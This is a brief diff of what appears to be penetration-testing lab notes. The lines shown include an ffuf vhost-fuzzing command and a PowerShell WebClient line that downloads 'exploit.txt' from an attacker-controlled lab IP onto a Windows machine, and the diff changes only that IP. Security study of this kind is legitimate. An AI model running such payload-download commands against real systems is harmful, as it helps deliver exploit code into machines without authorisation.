@@ -20,6 +20,6 @@ ffuf -u http://<URL>/ -H "HOST: FUZZ.<URL>" -w /usr/share/SecLists/Discovery/DNS
 
 ```
 $wc = New-Object System.Net.WebClient 
-$wc.DownloadFile("http://192.168.45.232/exploit.txt","C:\Users\student\Downloads\exploit.txt") 
+$wc.DownloadFile("http://192.168.45.238/exploit.txt","C:\Users\student\Downloads\exploit.txt") 
 ```
 
